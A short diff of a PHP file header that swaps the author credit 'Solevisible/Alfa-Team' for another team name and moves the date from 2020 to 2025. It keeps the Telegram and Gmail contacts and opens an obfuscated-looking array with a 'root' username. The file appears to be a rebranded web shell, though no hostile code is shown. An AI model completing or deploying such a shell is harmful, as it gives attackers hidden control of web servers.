@@ -1,9 +1,9 @@
 <?php
 /*
-	Author: 	Solevisible/Alfa-Team
+	Author: 	Seohilanghilang/JAGuAr-Team
 	Telegram: 	https://t.me/sall1504
 	Gmail:		bryanandbruno16@gmail.com
-	Date:		Monday, 17 Maret, 2020
+	Date:		Monday, 17 Maret, 2025
 */
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'root',
